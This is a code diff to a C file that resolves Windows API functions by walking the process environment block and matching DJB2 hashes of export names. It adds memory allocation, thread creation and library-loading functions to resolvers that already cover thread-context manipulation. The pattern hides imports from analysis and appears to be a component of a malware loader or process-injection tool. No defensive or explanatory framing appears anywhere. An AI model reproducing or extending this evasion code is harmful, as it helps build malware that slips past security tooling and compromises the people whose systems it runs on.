@@ -50,6 +50,13 @@ FP_ResumeThread                  _r_ResumeThread                  = NULL;
 FP_GetThreadContext              _r_GetThreadContext              = NULL;
 FP_SetThreadContext              _r_SetThreadContext              = NULL;
 FP_GetModuleHandleW              _r_GetModuleHandleW              = NULL;
+FP_VirtualAlloc                  _r_VirtualAlloc                  = NULL;
+FP_VirtualFree                   _r_VirtualFree                   = NULL;
+FP_CreateThread                  _r_CreateThread                  = NULL;
+FP_GetProcAddress                _r_GetProcAddress                = NULL;
+FP_LoadLibraryA                  _r_LoadLibraryA                  = NULL;
+FP_LoadLibraryW                  _r_LoadLibraryW                  = NULL;
+FP_GetModuleHandleA              _r_GetModuleHandleA              = NULL;
 
 /* =========================================================================
  * DJB2 hash of a null-terminated byte string (case-sensitive)
@@ -126,7 +133,7 @@ static void *get_export(void *base, uint32_t fn_hash) {
  * kernelbase.dll on Windows 10+.  Iterating all modules and skipping
  * forwarders finds the real implementation regardless of where it lives.
  * ========================================================================= */
-static void *resolve_fn(uint32_t fn_hash) {
+void *resolve_fn(uint32_t fn_hash) {
     void *peb = peb_get();
     if (!peb) return NULL;
 
@@ -199,4 +206,11 @@ void api_init(void) {
     _r_GetThreadContext         = (FP_GetThreadContext)         resolve_fn(H_GetThreadContext);
     _r_SetThreadContext         = (FP_SetThreadContext)         resolve_fn(H_SetThreadContext);
     _r_GetModuleHandleW         = (FP_GetModuleHandleW)         resolve_fn(H_GetModuleHandleW);
+    _r_VirtualAlloc             = (FP_VirtualAlloc)             resolve_fn(H_VirtualAlloc);
+    _r_VirtualFree              = (FP_VirtualFree)              resolve_fn(H_VirtualFree);
+    _r_CreateThread             = (FP_CreateThread)             resolve_fn(H_CreateThread);
+    _r_GetProcAddress           = (FP_GetProcAddress)           resolve_fn(H_GetProcAddress);
+    _r_LoadLibraryA             = (FP_LoadLibraryA)             resolve_fn(H_LoadLibraryA);
+    _r_LoadLibraryW             = (FP_LoadLibraryW)             resolve_fn(H_LoadLibraryW);
+    _r_GetModuleHandleA         = (FP_GetModuleHandleA)         resolve_fn(H_GetModuleHandleA);
 }
